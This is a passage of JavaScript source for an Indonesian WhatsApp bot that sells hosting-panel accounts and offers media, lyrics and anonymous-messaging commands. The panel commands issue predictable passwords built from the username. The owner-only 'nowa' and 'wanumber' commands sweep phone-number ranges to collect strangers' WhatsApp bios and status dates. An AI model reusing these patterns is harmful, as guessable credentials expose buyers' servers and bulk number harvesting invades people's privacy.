"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://linktr.ee/slimextzy","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "unlisaldo": {
if (cekSaldo(sender,db_saldo) < 15000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp15.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(sender, 15000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "@slime.xyz"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "@999"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://linktr.ee/slimextzy","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "8gbsaldo": {
if (cekSaldo(sender,db_saldo) < 9000) return slime.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp9.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
minSaldo(sender, 9000, db_saldo)
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "180"
let disk = "8000"
let email = username + "@slime.xyz"
let d = (await slime.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "@100"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`*Berhasil Membuat Akun Panel ✅*\nData Akun Sudah Dikirim Ke Private Chat`)
ctf = `*Berhasil Membuat Akun Panel ✅*

* *ID :* ${user.id}
* *Nama :* ${user.username}
* *Ram :* ${memo}
* *Cpu :* ${cpu}%
* *Created :* ${tanggal2}

*Rules Pembelian Panel ⚠️*
* *Simpan Data Ini Sebaik*
        *Mungkin, Saya Hanya*
        *Mengirim 1 Kali !*
* *Data Hilang/Lupa*
        *Akun, Saya Tidak Akan*
        *Bertanggung Jawab !*
* *Garansi Aktif 10 Hari*
* *Claim Garansi Wajib*
        *Bawa Bukti Ss Chat Saat*
        *Pembelian*
`
let msg = generateWAMessageFromContent(from, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
body: proto.Message.InteractiveMessage.Body.create({
text: ctf
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: `© SlimexTzy`
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Group Marketplace","url":"https://linktr.ee/slimextzy","merchant_url":"https://www.google.com"}`
},
{
"name": "cta_url",
"buttonParamsJson": `{"display_text":"Login Server Panel","url":"${domain}","merchant_url":"https://www.google.com"}`
}, {
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Username",
"copy_code": `${user.username}`
})
},
{
"name": "cta_copy",
"buttonParamsJson": JSON.stringify({
"display_text": "Copy Password",
"copy_code": `${password}`
})
}
],
}),
contextInfo: {
mentionedJid: [m.sender], 
forwardingScore: 999,
isForwarded: false,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363325328533494@newsletter",
newsletterName: "ᴘᴏᴡᴇʀᴇᴅ ʙʏ lynnzxd",
serverMessageId: 145
}
}})}}
}, {quoted: m})
await slime.relayMessage(u, msg.message, {
messageId: msg.key.id
})
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case 'limit':{
if (!isRegistered) return reply('Anda balum terdaftar\nsilahkan ketik .daftar')
reply('*Your Limit:* ' + (db.data.users[m.sender].limit))
}
break
case 'removebg':
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .removebg*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .removebg*`)
  if (/image/.test(mime)) {
m.reply(mess.wait)
  let mee = await slime.downloadAndSaveMediaMessage(quoted)
  const TelegraPH = require('./lib/uploader')
  let mem = await TelegraPH(mee)
  let shannz = await (await fetch(`https://api.shannmoderz.xyz/tools/removebg?url=${mem}`)).json()
  let bg = shannz.result.image
  slime.sendMessage(m.chat,{image:{url: bg }, caption: '*SUCCESS* ✅'},{quoted: m})
}
break
case 'apkdl':
  if (!text) return m.reply('*masukkan nama aplikasi yang ingin diunduh?*')
  try {
    m.reply('*Process Taking, mungkin membutuhkan waktu yang lama sesuai dengan ukuran aplikasi!*')
  let apk = await (await fetch('https://api.shannmoderz.xyz/downloader/aptoide?id=' + text)).json();
  let app = apk.result;
  slime.sendMessage(m.chat, { document: { url: app.link }, fileName: app.appname + '.apk', mimetype: 'application/xapk', caption: `*Developers By :* ${app.developer}`}, { quoted: m })
} catch (e) {
    m.reply('*terjadi error :* ' + e)
}
break
/*
FITUR CREATED BY SLIMEXTZY
WALAU CUMA NGEGABUNGIN AJA
SORRY MASIH PEMULA:>
*`SUMBER`*
https://whatsapp.com/channel/0029VaicyTbAjPXOdW7P9f2x
*/
case 'lyrics': case 'lirik': {
let yts = require('yt-search') 
if (!isRegistered) return reply(mess.regis) 
if (!text) return reply(`Contoh ${prefix + command} Sekecewa Itu`) 
  try {
    let lirik = await fetchJson(`https://api.shannmoderz.xyz/tools/lirik?query=${text}`) 
    let send = lirik.result.lyrics
   reply(send)
    let res = await yts(text)
    let url = res.all;
    let result = url[Math.floor(Math.random() * url.length)]
   let load = await (await fetch(`https://api.shannmoderz.xyz/downloader/yt-audio?url=${result.url}`)).json();
  let nihsound = load.result
  
await slime.sendMessage(m.chat, { audio: { url:nihsound.download_url }, mimetype: 'audio/mp4', },  { contextInfo:  {externalAdReply: `${result.title}`, body: `Upload At: ${result.ago}`, thumbnailUrl: `${result.url}`, mediaType: 2, mediaUrl: `${result.url}`, sourceUrl: `${result.url}`,renderLargerThumbnail: true,}});
} catch (err) {
   reply('Maaf Lyrics Sedang Erorr') 
   }
}
break
            case 'lirik2':
            case 'lyrics2': {
if (!text) return reply(`What lyrics you looking for?\nExample usage: ${prefix}lyrics Thunder`)
reply(mess.wait)
const { lyrics, lyricsv2 } = require('@bochilteam/scraper')
const result = await lyricsv2(text).catch(async _ => await lyrics(text))
const xeonlirik = `
*Title :* ${result.title}
*Author :* ${result.author}
*Url :* ${result.link}

*Lyrics :* ${result.lyrics}

`.trim()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: xeonlirik
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./SlimeMedia/image/slime.jpg')}, { upload: slime.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"✨\",\"id\":\""}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363325328533494@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await slime.relayMessage(m.chat, msgs.message, {})
}
break
case 'resetlimit': {
if (!isCreator) return reply(mess.owner)
let list = Object.entries(global.db.data.users)
	let lim = !args || !args[0] ? 100 : isNumber(args[0]) ? parseInt(args[0]) : 100
	lim = Math.max(1, lim)
	list.map(([user, data], i) => (Number(data.limit = lim)))
		slime.sendMessage(m.chat, {text: `*Limit berhasil direset ${lim} / user*`}, { quoted: m })
		}
break

case 'addlimit': {
if (!isCreator) return reply(mess.owner)
if (!text) return reply('Masukkan Jumlah Limit Yang Akan Diberi')
    let who
    if (m.isGroup) who = m.mentionedJid[0]
    else who = m.chat
    if (!who) throw reply('Tag Orangnya')
    let txt = text.replace('@' + who.split`@`[0], '').trim()
    if (isNaN(txt)) throw reply('Hanya Angka')
    let poin = parseInt(txt)
    let limit = poin
    if (limit < 1) throw reply('Minimal 1')
    let user = global.db.data.users
    user[who].limit += poin
    if (limit > 9999999) return reply('Jangan Banyak² Jir 😂') 
    slime.sendMessage(m.chat, {text: `Selamat @${who.split`@`[0]}. Kamu Mendapatkan +${poin} Limit!`}, {quoted:m})
    }
break
case 'confess': case 'confes': case 'menfes': case 'menfess':{
if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
slime.menfes = slime.menfes ? slime.menfes : {}
roof = Object.values(slime.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (roof) return reply("Kamu masih berada dalam sesi menfess\n\nsilahkan ketik .stopmenfes untuk mengakhiri sesi menfes")
if (!text) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n\nMasih tidak paham? berikut link video tutorialnya : https://videy.co/v?id=B5WRJO2h`)
if (!text.includes('|')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|6292818802718|Menfes nih\n\nNomor tidak boleh ada spasi atau tanda + dan nomor harus berawalan 62`)
let [namaNya, nomorNya, pesanNya] = text.split`|`
if (nomorNya.startsWith('0')) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
if(isNaN(nomorNya)) return reply(`Kirim Perintah ${prefix + command} nama|nomor|pesan\n\nContoh :\n${prefix + command} ${pushname}|628xxx|Menfes nih\n`)
var yoi = `Hi ada menfess nih buat kamu\n\nDari : ${namaNya}\nPesan : ${pesanNya}\n\nSilahkan ketik ${prefix}balasmenfess -- Untuk menerima menfess/confess\nSilahkan ketik ${prefix}tolakmenfess -- Untuk menolak menfess/confess\n\n_Pesan ini di tulis oleh seseorang pengguna bot, bot hanya menyampaikan saja_`
let tod = await getBuffer('https://telegra.ph/file/c8fdfc8426f5f60b48cca.jpg') 
let id = m.sender
slime.menfes[id] = {
id,
a: m.sender,
b: nomorNya + "@s.whatsapp.net",
state: 'WAITING'
}
 await slime.sendMessage(nomorNya + '@s.whatsapp.net', {image: tod, caption:yoi }, {})
reply('Pesan berhasil dikirim ke nomor tujuan. Moga aja dibales coy')
}
break
case 'balasmenfess': case 'balasmenfes': case 'accmenfess':{
if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
let roof = Object.values(slime.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender));
if (!roof) return reply("Belum ada sesi menfess");
let room = Object.values(slime.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING');
if (!room) return reply("Tidak ada sesi menfess yang sedang menunggu");
let other = [room.a, room.b].find(user => user !== m.sender);
room.b = m.sender;
room.state = 'CHATTING';
slime.menfes[room.id] = {...room};
await slime.sendMessage(other, { 
  text: `_Seseorang telah menerima menfess kamu, ketik .chatfes <pesan kamu> untuk mengirim pesan\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess\n\nVideo tutorial membalas pesan menfes : https://videy.co/v?id=B5WRJO2h`, 
  mentions: [m.sender]
});
slime.sendMessage(m.chat, { 
  text: `_Menfess telah diterima, ketik .chatfes <pesan kamu> untuk mengirim pesan\n\n*NOTE :*\nJika ingin berhenti dari menfess, silahkan ketik .stopmenfess\n\nVideo tutorial membalas pesan menfes : https://videy.co/v?id=B5WRJO2h`
});
}
break
 case 'tolakmenfess': case 'tolakmenfes': case 'rejecmenfess':{
if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
roof = Object.values(slime.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!roof) return reply("Belum ada sesi menfess")
let room = Object.values(slime.menfes).find(room => [room.a, room.b].includes(m.sender) && room.state === 'WAITING')
let other = [room.a, room.b].find(user => user !== m.sender)
find = Object.values(slime.menfes).find(menpes => menpes.state == 'WAITING')
slime.sendMessage(other, {text: `_Uppsss... @${m.sender.split("@")[0]} Menolak menfess kamu_`, mentions: [m.sender]})
// await slime.sendMessage(find.a, {text: `_Uppsss... @${find.b.split("@")[0]} Menolak menfess kamu_`,mentions: [find.b]})
reply("Menfess berhasil di tolak 🤚")
delete slime.menfes[roof.id]
}
break
 case 'stopconfess': case 'stopmenfess': case 'stopmenfes': {
 //find = Object.values(slime.menfes).find(menpes => menpes.state == 'WAITING')
if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
find = Object.values(slime.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender))
if (!find) return reply("Belum ada sesi menfess")
const to = find.a == m.sender ? find.b : find.a
slime.sendMessage(to, {text: `_Teman chat telah menghentikan menfess ini_`, mentions:[m.sender]})
await reply("ok")
delete slime.menfes[find.id]
}
 break

case 'chatfes': {
if (m.isGroup) return reply('Fitur Hanya Dapat Digunakan Di Private Chat Bot!')
    let find = Object.values(slime.menfes).find(menpes => [menpes.a, menpes.b].includes(m.sender) && menpes.state === 'CHATTING');
    if (!find) return reply("Kamu tidak berada dalam sesi menfess yang sedang aktif.");
    const to = find.a === m.sender ? find.b : find.a;
    if (!text) return reply("Silakan masukkan pesan yang ingin dikirim.");
    await slime.sendMessage(to, {
        text: `*Pesan dari Menfess*\n\n${text}`,
        mentions: [m.sender]
    });
    m.reply("Pesan berhasil dikirim ke partner menfess.");
}
break;
case "ssweb": {
    let link = text; // Simpan link yang dikirim ke dalam variabel 'link'
    if (!link) return reply(`Contoh ${prefix + command} link`);
    if (!/^https?:\/\//.test(link)) return reply('Awali *URL* dengan http:// atau https://');
    if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                

    let msg = generateWAMessageFromContent(from, {
        viewOnceMessage: {
            message: {
                "messageContextInfo": {
                    "deviceListMetadata": {},
                    "deviceListMetadataVersion": 2
                },
                interactiveMessage: proto.Message.InteractiveMessage.create({
                    body: proto.Message.InteractiveMessage.Body.create({
                        text: 'Silahkan pilih *option* di bawah ini'
                    }),
                    footer: proto.Message.InteractiveMessage.Footer.create({
                        text: wm
                    }),
                    header: proto.Message.InteractiveMessage.Header.create({
                        title: ``,
                        gifPlayback: true,
                        subtitle: ownername,
                        hasMediaAttachment: false
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                        buttons: [
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Desktop","id":"${prefix}sswebdesktop ${link}"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Tablet","id":"${prefix}sswebtablet ${link}"}`
                            },
                            {
                                "name": "quick_reply",
                                "buttonParamsJson": `{"display_text":"Phone","id":"${prefix}sswebphone ${link}"}`
                            }
                        ],
                    }),
                    contextInfo: {
                        mentionedJid: [m.sender],
                        forwardingScore: 999,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                                newsletterName: saluran,
                                newsletterJid: idsal,
                            serverMessageId: 143
                        }
                    }
                })
            }
        }
    }, {});

    await slime.relayMessage(msg.key.remoteJid, msg.message, {
        messageId: msg.key.id
    });
}
break

case "sswebdesktop":{
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebDesktop(text)
slime.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

case "sswebtablet":{
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebTablet(text)
slime.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break

case "sswebphone":{
if (!text) return reply(`Contoh ${prefix+command} link`)
if (!/^https?:\/\//.test(text)) return reply('Awali *URL* dengan http:// atau https://')
reply(mess.wait)
let krt = await sswebPhone(text)
slime.sendMessage(from ,{ image: krt.result, caption: mess.success },{ quoted: m })
}
break
 case 'news-game': {
    const axios = require('axios');
    const cheerio = require('cheerio');
// wm avs
    const url = 'https://www.gamespot.com/news/';
// wm avs
    try {
        const response = await axios.get(url);
        const $ = cheerio.load(response.data);
        let news = [];
// wm avs
        $('.media-title').each((i, elem) => {
            news.push($(elem).text().trim());
        });
// wm avs
        if (news.length === 0) {
            return m.reply('Tidak ada Game Terbaru.');
        }
// wm avs
        let result = `News Game In 2024\n`;
        news.slice(0, 5).forEach((headline, index) => {
            result += `${index + 1}. ${headline}\n`;
        });
// wm avs
        slime.sendMessage(m.chat, { text: result }, { quoted: m });
    } catch (error) {
        m.reply('ad error.');
    }
}
break
case'blackpink':case'rainbow2':case'water_pipe':case'halloween':case'sketch':case'sircuit':case'discovery':case'metallic2':case'fiction':case'demon':case'transformer':case'berry':case'thunder':case'magma':case'3dstone':case'neon':case'glitch':case'harry_potter':case'embossed':case'broken':case'papercut':case'gradient':case'glossy':case'watercolor':case'multicolor':case'neon_devil':case'underwater':case'bear':case'wonderfulg':case'christmas':case'neon_light':case'snow':case'cloudsky':case'luxury2':case'gradient2':case'summer':case'writing':case'engraved':case'summery':case'3dglue':case'metaldark':case'neonlight':case'oscar':case'minion':case'holographic':case'purple':case'glossyb':case'deluxe2':case'glossyc':case'fabric':case'neonc':case'newyear':case'newyear2':case'metals':case'xmas':case'blood':case'darkg':case'joker':case'wicker':case'natural':case'firework':case'skeleton':case'balloon':case'balloon2':case'balloon3':case'balloon4':case'balloon5':case'balloon6':case'balloon7':case'steel':case'gloss':case'denim':case'decorate':case'decorate2':case'peridot':case'rock':case'glass':case'glass2':case'glass3':case'glass4':case'glass5':case'glass6':case'glass7':case'glass8':case'captain_as2':case'robot':case'equalizer':case'toxic':case'sparkling':case'sparkling2':case'sparkling3':case'sparkling4':case'sparkling5':case'sparkling6':case'sparkling7':case'decorative':case'chocolate':case'strawberry':case'koifish':case'bread':case'matrix':case'blood2':case'neonligth2':case'thunder2':case'3dbox':case'neon2':case'roadw':case'bokeh':case'gneon':case'advanced':case'dropwater':case'wall':case'chrismast':case'honey':case'drug':case'marble':case'marble2':case'ice':case'juice':case'rusty':case'abstra':case'biscuit':case'wood':case'scifi':case'metalr':case'purpleg':case'shiny': case'jewelry':case'jewelry2':case'jewelry3':case'jewelry4':case'jewelry5':case'jewelry6':case'jewelry7':case'jewelry8':case'metalh':case'golden':case'glitter':case'glitter2':case'glitter3':case'glitter4':case'glitter5':case'glitter6':case'glitter7':case'metale':case'carbon':case'candy':case'metalb':case'gemb':case'3dchrome':case'metalb2':case'metalg':
{
if (isBan) return reply('Lu di ban kocak awokwok') 
if (!text) return reply(`Gunakan dengan cara .neon *text*`)
if (!isPrem && global.db.data.users[sender].limit < 1) return reply('Maaf Dek Limit Anda Habis Ingin Membeli Limit Ketik .buylimit')
             db.data.users[sender].limit -= 1 // -1 limit
                
slime.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
let texpro = await getBuffer(`https://api.zeeoneofc.my.id/api/textpro/${command}?text=${q}&apikey=junaa`)
try{
await slime.sendMessage(m.chat, {image: texpro, caption: "Done dek"}, {quoted: m})
slime.sendMessage(m.chat, { react: { text: `✅`, key: m.key }})
} catch (err){
reply(`error`) 
}
}
break
       case 'nowa': {
if (!isCreator) return reply(`Khusus SlimexTzy Aja`)
if (!args[0]) return m.reply(`Kirim perintah ${prefix+command} <nomer>`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('Salah Tuan Bukan Begitu Xixi')
m.reply('Wait Tuan Sedang Kami Proses⏳')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')] : ''
var random_length = countInstances(noteks, 'x')
var random;
if (random_length == 1) {
random = 10
} else if (random_length == 2) {
random = 100
} else if (random_length == 3) {
random = 1000
}
var nomerny = `LIST NOMER WHATSAPP\n\nPunya Bio/status/info\n`
var no_bio = `\nTanpa Bio/status/info || \nHey there! I am using WhatsApp.\n`
var no_watsap = `\nTidak Terdaftar\n`
for (let i = 0; i < random; i++) {
var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
var dom1 = nu[Math.floor(Math.random() * nu.length)]
var dom2 = nu[Math.floor(Math.random() * nu.length)]
var dom3 = nu[Math.floor(Math.random() * nu.length)]
var dom4 = nu[Math.floor(Math.random() * nu.length)]
var rndm;
if (random_length == 1) {
rndm = `${dom1}`
} else if (random_length == 2) {
rndm = `${dom1}${dom2}`
} else if (random_length == 3) {
rndm = `${dom1}${dom2}${dom3}`
} else if (random_length == 4) {
rndm = `${dom1}${dom2}${dom3}${dom4}`
}
var anu = await slime.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
var anuu = anu.length !== 0 ? anu : false
try {
try {
var anu1 = await slime.fetchStatus(anu[0].jid)
} catch {
var anu1 = '401'
}
if (anu1 == '401' || anu1.status.length == 0) {
no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
} else {
nomerny += `wa.me/${anu[0].jid.split("@")[0]}\nBiography : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`
}
} catch {
no_watsap += `${nomer0}${i}${nomer1}\n`
}
}
m.reply(`${nomerny}${no_bio}${no_watsap}`)
}
break
case 'wanumber': case 'neednokos': case 'nokoswa':{
if (!isCreator) return reply(`Khusus SlimexTzy Aja`)
if (!text) return reply(`Provide Number with last number x\n\nExample: ${prefix + command} 91690913721x`)
var inputnumber = text.split(" ")[0]
        
        reply(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
        var nobio = `\n*Bio:* || \nHey there! I am using WhatsApp.\n`
        var nowhatsapp = `\n*Numbers with no WhatsApp account within provided range.*\n`
        for (let i = 0; i < randomxx; i++) {
            var nu = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
            var status1 = nu[Math.floor(Math.random() * nu.length)]
            var status2 = nu[Math.floor(Math.random() * nu.length)]
            var status3 = nu[Math.floor(Math.random() * nu.length)]
            var dom4 = nu[Math.floor(Math.random() * nu.length)]
            var random21
            if (random_length == 1) {
                random21 = `${status1}`
